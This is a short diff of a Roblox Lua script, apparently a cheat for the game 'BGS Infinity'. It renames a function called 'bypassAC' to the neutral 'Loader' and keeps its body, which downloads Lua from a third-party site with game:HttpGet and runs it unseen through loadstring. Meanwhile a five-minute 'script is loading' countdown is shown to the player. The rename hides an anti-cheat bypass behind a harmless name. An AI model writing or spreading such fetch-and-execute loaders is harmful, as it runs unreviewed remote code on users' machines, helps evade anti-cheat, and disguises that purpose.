@@ -13,16 +13,16 @@ local function ShowCountdown(title, baseMessage, duration)
     end
 end
 
- -- 1-minute countdown
 
 
-local function bypassAC()
+
+local function Loader()
         loadstring(game:HttpGet("https://arscripts.space/BGSI/BGSILoader.lua"))()
 end
 
 
 
-task.spawn(bypassAC)
+task.spawn(Loader)
 
 
 ShowCountdown("BGS INFINITY | V0.1, SCRIPT IS LOADING IN PLEASE WAIT FOR A BIT...", 300) -- 5-minute countdown
